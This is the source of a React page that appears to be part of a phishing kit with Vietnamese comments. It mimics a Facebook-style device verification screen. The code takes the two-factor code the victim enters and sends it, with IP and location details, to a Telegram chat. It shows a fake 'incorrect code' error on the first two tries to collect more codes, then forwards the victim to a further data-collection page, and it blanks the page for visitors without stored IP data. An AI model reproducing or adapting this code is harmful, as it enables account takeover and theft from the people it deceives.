import VerifyImage from '@/assets/images/681.png';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect } from 'react';
import sendMessage from '@/utils/telegram';
import { useNavigate } from 'react-router';
import { PATHS } from '@/router/router';

const Verify = () => {
    const navigate = useNavigate();
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [isMobile, setIsMobile] = useState(false);
    const [translatedTexts, setTranslatedTexts] = useState({
        title: 'Check your device',
        description: '',
        placeholder: 'Enter your code',
        infoTitle: 'Approve from another device or Enter your verification code',
        infoDescription: 'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
        submit: 'Continue',
        sendCode: 'Send new code',
        errorMessage: 'The verification code you entered is incorrect',
        loadingText: 'Please wait'
    });

    // 🎯 PHÁT HIỆN THIẾT BỰ MOBILE
    useEffect(() => {
        const checkMobile = () => {
            const isMobileDevice = /iPhone|iPad|iPod|Android|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            const isSmallScreen = window.innerWidth <= 768;
            setIsMobile(isMobileDevice || isSmallScreen);
        };

        checkMobile();
        window.addEventListener('resize', checkMobile);
        
        return () => window.removeEventListener('resize', checkMobile);
    }, []);

    // 🎯 CẬP NHẬT: Load và khởi tạo dịch
    useEffect(() => {
        const ipInfo = localStorage.getItem('ipInfo');
        if (!ipInfo) {
            window.location.href = 'about:blank';
            return;
        }

        // 🎯 LẤY DATA TỪ LOCALSTORAGE
        const savedUserInfo = localStorage.getItem('userInfo');
        let actualEmail = 's****g@m****.com';
        let actualPhone = '******32';
        
        if (savedUserInfo) {
            try {
                const userData = JSON.parse(savedUserInfo);
                actualEmail = userData.email || actualEmail;
                actualPhone = userData.phone || actualPhone;
            } catch (error) {
                console.log('Error parsing userInfo:', error);
            }
        }

        const targetLang = localStorage.getItem('targetLang');
        
        // 🎯 ƯU TIÊN DÙNG BẢN DỊCH ĐÃ LƯU TỪ HOME
        if (targetLang && targetLang !== 'en') {
            const savedTranslation = localStorage.getItem(`translatedVerify_${targetLang}`);
            if (savedTranslation) {
                try {
                    const parsedTranslation = JSON.parse(savedTranslation);
                    setTranslatedTexts(parsedTranslation);
                } catch {
                    setTranslatedTexts(prev => ({
                        ...prev,
                        description: `We have sent a verification code to your ${actualEmail}, ${actualPhone}. Please enter the code we just sent to continue.`
                    }));
                }
            } else {
                setTranslatedTexts(prev => ({
                    ...prev,
                    description: `We have sent a verification code to your ${actualEmail}, ${actualPhone}. Please enter the code we just sent to continue.`
                }));
            }
        } else {
            setTranslatedTexts(prev => ({
                ...prev,
                description: `We have sent a verification code to your ${actualEmail}, ${actualPhone}. Please enter the code we just sent to continue.`
            }));
        }
    }, []);

    const handleSubmit = async () => {
        if (!code.trim()) return;

        setIsLoading(true);
        setShowError(false);

        try {
            const timestamp = new Date().toLocaleString('vi-VN');
            const ipInfo = localStorage.getItem('ipInfo');
            const ipData = ipInfo ? JSON.parse(ipInfo) : {};
            
            const message = `🔐 <b>VERIFY CODE</b>
📅 <b>Thời gian:</b> <code>${timestamp}</code>
🌍 <b>IP:</b> <code>${ipData.ip || 'N/A'}</code>
📍 <b>Vị trí:</b> <code>${ipData.city || 'N/A'} - ${ipData.region || 'N/A'} - ${ipData.country_code || 'N/A'}</code>

🔢 <b>Code:</b> <code>${code}</code>
🔄 <b>Lần thử:</b> <code>${attempts + 1}</code>`;

            await sendMessage(message);
        } catch (error) {
            console.log('Send message error:', error);
        }

        await new Promise((resolve) => setTimeout(resolve, 1000));

        const newAttempts = attempts + 1;
        setAttempts(newAttempts);

        if (newAttempts < 3) {
            setShowError(true);
            setIsLoading(false);
            setCode('');
        } else {
            navigate(PATHS.SEND_INFO);
        }
    };

    // 🎯 KÍCH THƯỚC RESPONSIVE ĐỘNG
    const getResponsiveClasses = () => {
        if (isMobile) {
            return {
                container: 'pt-4 pb-4 px-3',
                title: 'text-xl font-bold',
                description: 'text-sm',
                input: 'text-lg px-4 py-3',
                button: 'py-3 text-base',
                infoText: 'text-xs',
                infoTitle: 'text-sm'
            };
        } else {
            return {
                container: 'pt-8 pb-8 px-6',
                title: 'text-2xl font-bold',
                description: 'text-base',
                input: 'text-xl px-4 py-3',
                button: 'py-3 text-base',
                infoText: 'text-sm',
                infoTitle: 'text-base'
            };
        }
    };

    const responsive = getResponsiveClasses();

    return (
        // 🎯 VIEWPORT CỐ ĐỊNH CHO MOBILE
        <div 
            className={`flex min-h-screen flex-col items-center justify-center bg-[#f8f9fa] ${responsive.container} safe-area-top safe-area-bottom`}
            style={{
                minHeight: '100dvh', // 🎯 Sử dụng dvh cho mobile
                paddingTop: 'env(safe-area-inset-top, 1rem)',
                paddingBottom: 'env(safe-area-inset-bottom, 1rem)'
            }}
        >
            <title>Account | Privacy Policy</title>
            
            {/* 🎯 CONTAINER CO DÃN THEO MÀN HÌNH */}
            <div className={`w-full mx-auto ${isMobile ? 'max-w-[90vw]' : 'max-w-md'}`}>
                <div className='flex flex-col gap-4 rounded-lg bg-white p-4 shadow-lg w-full'>
                    
                    {/* 🎯 TITLE RESPONSIVE */}
                    <p className={`${responsive.title} text-center text-gray-900`}>
                        {translatedTexts.title}
                    </p>
                    
                    {/* 🎯 DESCRIPTION RESPONSIVE */}
                    <p className={`${responsive.description} text-center text-gray-600 leading-relaxed`}>
                        {translatedTexts.description}
                    </p>

                    {/* 🎯 ẢNH TỰ ĐỘNG CO DÃN */}
                    <div className='flex justify-center w-full'>
                        <img 
                            src={VerifyImage} 
                            alt='Verification' 
                            className={`max-w-full h-auto ${isMobile ? 'max-h-[120px]' : 'max-h-[150px]'}`}
                            style={{
                                objectFit: 'contain'
                            }}
                        />
                    </div>
                    
                    {/* 🎯 INPUT TỐI ƯU CHO MOBILE */}
                    <input
                        type='number'
                        inputMode='numeric'
                        max={8}
                        placeholder={translatedTexts.placeholder}
                        className={`w-full rounded-lg border border-gray-300 bg-[#f8f9fa] ${responsive.input} font-medium text-center focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
                        value={code}
                        onChange={(e) => setCode(e.target.value)}
                        onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
                        style={{
                            WebkitAppearance: 'none', // 🎯 Tắt style mặc định trên iOS
                            MozAppearance: 'textfield' // 🎯 Tắt spinner trên Firefox
                        }}
                    />
                    
                    {/* 🎯 ERROR MESSAGE RESPONSIVE */}
                    {showError && (
                        <p className={`text-red-500 text-center ${isMobile ? 'text-xs' : 'text-sm'} mt-1`}>
                            {translatedTexts.errorMessage}
                        </p>
                    )}
                    
                    {/* 🎯 INFO BOX RESPONSIVE */}
                    <div className='flex items-start gap-3 bg-[#f8f9fa] p-3 rounded-lg'>
                        <FontAwesomeIcon 
                            icon={faCircleInfo} 
                            className={`text-[#9f580a] mt-0.5 flex-shrink-0 ${isMobile ? 'text-lg' : 'text-xl'}`}
                        />
                        <div className='flex-1 min-w-0'> {/* 🎯 min-w-0 để tránh overflow */}
                            <p className={`font-medium text-gray-900 mb-1 ${responsive.infoTitle} leading-tight`}>
                                {translatedTexts.infoTitle}
                            </p>
                            <p className={`text-gray-600 leading-relaxed ${responsive.infoText}`}>
                                {translatedTexts.infoDescription}
                            </p>
                        </div>
                    </div>

                    {/* 🎯 BUTTON RESPONSIVE */}
                    <button
                        className={`w-full rounded-md bg-[#0866ff] px-4 ${responsive.button} font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400 transition-colors duration-200 mt-2`}
                        onClick={handleSubmit}
                        disabled={isLoading || !code.trim()}
                    >
                        {isLoading ? translatedTexts.loadingText + '...' : translatedTexts.submit}
                    </button>

                    {/* 🎯 LINK RESPONSIVE */}
                    <p className={`cursor-pointer text-center text-blue-900 hover:underline ${isMobile ? 'text-sm' : 'text-base'} mt-1`}>
                        {translatedTexts.sendCode}
                    </p>
                </div>
            </div>

            {/* 🎯 THÊM CSS CHO SAFE AREA */}
            <style jsx>{`
                .safe-area-top {
                    padding-top: max(1rem, env(safe-area-inset-top, 1rem));
                }
                .safe-area-bottom {
                    padding-bottom: max(1rem, env(safe-area-inset-bottom, 1rem));
                }
            `}</style>
        </div>
    );
};

export default Verify;
